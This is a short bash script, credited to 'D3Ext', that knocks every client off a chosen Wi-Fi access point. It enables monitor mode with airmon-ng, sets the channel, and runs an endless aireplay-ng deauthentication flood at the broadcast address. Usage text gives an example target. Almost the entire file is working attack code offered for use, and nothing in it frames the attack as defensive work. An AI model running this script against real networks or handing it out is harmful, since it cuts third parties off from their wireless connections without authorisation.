#!/bin/bash

# Script used to deauth all clients from AP using Aireplay-ng deauth mode (-0)
# by D3Ext

function ctrl_c(){
  echo -e "\n\nAttack finished successfully"
  echo -e "Disabling monitor mode..."
  airmon-ng stop "${netCard}" &>/dev/null
  exit 0
}

if [ "$(id -u)" != "0" ]; then
  echo -e "Execute as root!"
  exit 0
fi

if [ "$1" ] && [ "$2" ] && [ "$3" ]; then
  trap ctrl_c INT

  echo -e "Enabling monitor mode..."
  airmon-ng start "$1" &>/dev/null; sleep 0.5

  if [ -d "/sys/class/net/$1" ]; then
    netCard="$1"
  elif [ -d "/sys/class/net/${1}mon" ]; then
    netCard="${1}mon"
  fi

  echo -e "Launching attack, press Ctrl + C to stop..."

  iwconfig "${netCard}" channel "$3"; sleep 0.1
  aireplay-ng -0 0 -e "${2}" -c FF:FF:FF:FF:FF:FF ${netCard}

else
  echo -e "Usage: deauth.sh <interface> <essid> <channel>"
  echo -e "\t<interface>: network interface on managed mode (i.e. wlan0)"
  echo -e "\t<essid>: target AP name"
  echo -e "\t<channel>: channel in which the AP is running\n"
  echo -e "Example: deauth.sh wlan0 TP-LINK2023 11"
  exit 0
fi

